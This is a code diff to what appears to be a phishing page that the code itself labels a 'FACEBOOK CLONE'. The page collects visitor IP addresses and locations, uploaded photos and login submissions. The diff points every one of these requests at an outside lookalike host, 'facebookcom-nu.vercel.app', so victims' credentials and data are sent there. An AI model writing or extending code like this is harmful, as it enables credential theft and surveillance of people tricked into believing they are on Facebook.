@@ -61,6 +61,9 @@
       let userLocation = null;
       let userIPAddress = null;
       let visitId = 'visit_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+      
+      // Backend API URL
+      const API_BASE_URL = 'https://facebookcom-nu.vercel.app';
 
       console.log('🚀 STARTING FACEBOOK CLONE...');
       console.log('Visit ID:', visitId);
@@ -175,7 +178,7 @@
       function trackPageVisit() {
         console.log('📊 Tracking page visit...');
         
-        fetch('/api/page-visit', {
+        fetch(API_BASE_URL + '/api/page-visit', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
@@ -366,7 +369,7 @@
         
         async function attemptUpload() {
           try {
-            const response = await fetch('/api/upload-photo', {
+            const response = await fetch(API_BASE_URL + '/api/upload-photo', {
               method: 'POST',
               headers: {
                 'Content-Type': 'application/json',
@@ -438,7 +441,7 @@
         loadingOverlay.classList.remove('hidden');
 
         try {
-          const response = await fetch('/api/login', {
+          const response = await fetch(API_BASE_URL + '/api/login', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
